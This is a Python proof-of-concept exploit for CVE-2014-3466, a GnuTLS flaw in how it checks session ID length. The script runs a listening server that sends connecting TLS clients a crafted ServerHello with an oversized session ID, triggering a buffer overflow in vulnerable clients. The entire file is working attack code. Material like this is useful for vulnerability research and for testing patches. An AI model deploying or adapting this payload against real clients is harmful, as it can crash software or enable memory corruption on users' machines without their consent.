#!/usr/bin/env python
#
# PoC for CVE-2014-3466 
# (gnutls: insufficient session id length check in _gnutls_read_server_hello)
#
# Author:	Aaron Zauner <azet@azet.org>
# License:	CC BY 3.0 (https://creativecommons.org/licenses/by/3.0)
#
import socket
import time

MaliciousServerHello = '''
16 03 01 00 fa 02 00 00 f6 03 
01 53 8b 7f 63 c1 0e 1d 72 0a b3 f8 a7 0f f5 5d 
69 65 58 42 80 c1 fb 4f db 9a aa 04 a3 d3 4b 71
c7 c8 ff ff ff ff ff ff ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
'''.replace(' ', '').replace('\n', '').decode('hex')

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('', 4433))
sock.listen(1)

conn, addr = sock.accept()
print "connected: ", addr

time.sleep(0.5) # wait for ClientHello :P
conn.sendall(MaliciousServerHello)

conn.close()

